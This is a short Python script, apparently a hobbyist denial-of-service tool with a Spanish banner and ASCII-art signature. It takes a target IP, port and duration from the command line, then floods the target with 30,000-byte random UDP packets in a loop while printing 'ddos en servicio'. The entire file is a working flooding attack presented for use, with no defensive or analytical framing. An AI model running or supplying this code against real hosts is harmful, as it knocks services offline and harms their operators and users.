import sys
import socket
import os
import random 
import time

baner="""
---------------------------------------

	comandos para la herramienta

python dd.py ip puerto cantidad

pythob dd.py 192.168.1.10 8080 1000

--------------------------------------

..............              xela-stone
            ..,;:ccc,.                          
          ......''';lxO.                           
.....''''..........,:ld;                           
           .';;;:::;,,.x,                       
      ..'''.            0Xxoc:,.  ...              
  ....                ,ONkc;,;cokOdc',.            
 .                   OMo           ':ddo.          
                    dMc               :OO;         
                    0M.                 .:o.       
                    ;Wd                            
                     ;XO,
                       ,d0Odlc;,..
                           ..',;:cdOOd::,.
                                    .:d;.':;.
                                       'd,  .'
                                         ;l   ..
                                          .o
                                            c
                                            .'
                                             .


"""
print(baner)

def atack(ip,port,times):
    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(30000)
    timpo=time.time()+times
    x=3000
    while 1:

        if time.time() > timpo:
            break
        else:
            pass




        sock.sendto(bytes,(ip,port))
        x=x+1
        print(x,ip,port,"ddos en servicio")


def main():
    if len(sys.argv) != 4:
        print("Los datos no estan completos")
        print(baner)
    else:
        atack(sys.argv[1],int(sys.argv[2]),int(sys.argv[3]))
if __name__=="__main__":
    main()

